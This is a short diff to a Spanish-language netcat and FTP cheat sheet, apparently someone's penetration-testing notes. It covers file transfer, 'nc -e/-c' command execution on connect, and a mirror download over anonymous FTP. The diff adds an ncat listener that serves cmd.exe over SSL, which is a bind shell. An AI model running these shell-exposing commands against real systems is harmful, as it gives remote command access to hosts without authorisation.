@@ -1,4 +1,4 @@
-#NC-FTP
+#NC-NCAT-FTP
 **Transferencia de archivos**
     nc -lvp [puerto] > [archivo a guardar]
     nc -vv [ip] [puerto] < [archivo]
@@ -16,6 +16,9 @@
 
 **Ejecutar comando tras conectar nc**
 	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)/ -e (lo ejecuta exec)
+
+ncat -v IP PUERTO --ssl
+ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 
 **Descargar todo de ftp**
 	wget -m --no-passive ftp://anonymous:anonymous@IP
